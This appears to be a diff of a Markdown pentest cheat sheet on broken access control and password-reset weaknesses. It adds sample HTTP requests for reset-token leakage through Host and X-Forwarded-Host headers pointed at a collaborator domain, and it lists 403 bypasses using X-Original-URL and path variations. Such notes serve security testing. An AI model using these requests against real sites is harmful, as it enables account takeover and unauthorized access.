@@ -8,20 +8,28 @@
 	- use developer tools and check if cookies has HttpOnly flag (usually cookies that is important have the flag)
 
 ## tips & tricks
-***1. a parameter (resetPasswordUrlPrefix, urlForwarder, etc..) during reseting passwords***
-- try supply a payload from burp collaborator
-- check for DNS/HTTPS interactions? click on password reset link and check if token is leaked within interactions
+***1. password reset poisoning via parameter tampering***
+- a parameter (resetPasswordUrlPrefix, urlForwarder, etc..) during requesting for password reset link
+- supply a payload from burp collaborator to the parameter and check for DNS/HTTPS interactions when clicking on password reset link. Check if token is leaked within interactions
   
 ***2. forging a password reset token***
 - find out which part of the token is static and what changes?
 - can the changed part be bruteforce?
 - make the duration between 2 requests of password reset token creation shorter (use intruder), maybe the characters are going to be more predictable
   
-***3. leak password reset token via Host header injection***
-- add a new header with a payload from burp collaborator (any domain that you control)
-	- Host: bing.com
-	- X-Forwarded-Host: bing.com
-- check for DNS/HTTPS interactions? click on password reset link and check if token is leaked within interactions
+***3. password reset poisoning via host header***
+- add a new Host header with a controlled domain and see if token is leaked within HTTP interactions
+```
+GET /passwordResetLink HTTP/1.1
+Host: example.com
+Host: burpcollaborator.io	[1]
+X-Forwarded-Host: burpcollaborator.io	[2]
+```
+- make a GET request to absolute url but replace the Host header value and see if token is leaked within HTTP interactions
+```
+GET https://example.com/passwordResetLink HTTP/1.1
+Host: burpcollaborator.io
+```
 
 ***4. accessing unprotected/hidden administrative endpoints***
 - look for admin paths in common web files
@@ -37,7 +45,7 @@
 	- ?role=admin, ?admin=True, ?priv=high
  
 ***6. bypass deny access when accessing authenticated path***
-- try supply a new header like: X-Original-URL or X-Rewrite-URL
+- supply a new header like: X-Original-URL or X-Rewrite-URL
 ```
 GET /admin HTTP/1.1			403 Denied Access
 Session: normalusertoken
@@ -47,7 +55,7 @@ GET / HTTP/1.1
 X-Original-URL: /admin			200 Access Granted
 Session: normalusertoken
 ```
-- making use of path discrepancies
+- path discrepancies
 ```
 /admin 	      403 Denied Access >> /ADMIN 	200 Access Granted
 /admin/files 	403 Denied Access >> /admin/files/ 	200 	Access Granted
@@ -78,7 +86,7 @@ GET /admin-roles?username=normaluser&action=upgrade		200 Success
 Session: normalusertoken
 ```
 
-***8. userID is not incremental but GUIDs***
+***8. user GUIds leaked in app features***
 - look for a feature that involve other user's participation
 - E.g: /blog, /imageContribution, /comments, /chatbox
 - make a request and see if the GUIDs of other users are disclosed in the response
@@ -100,3 +108,9 @@ Session: normalusertoken
 ***12. bypass location-based access control***
 - stumble a page that only allow users from a certain country
 - use proxy or vpn and see if you can bypass deny access from other countries
+
+***13. password reset token leaked in referer header (H1: 342693/272379)***
+- request for password reset link
+- in the password reset page, click on any social media link then intercept the request
+- notice the password reset token is disclosed in the referer header
+
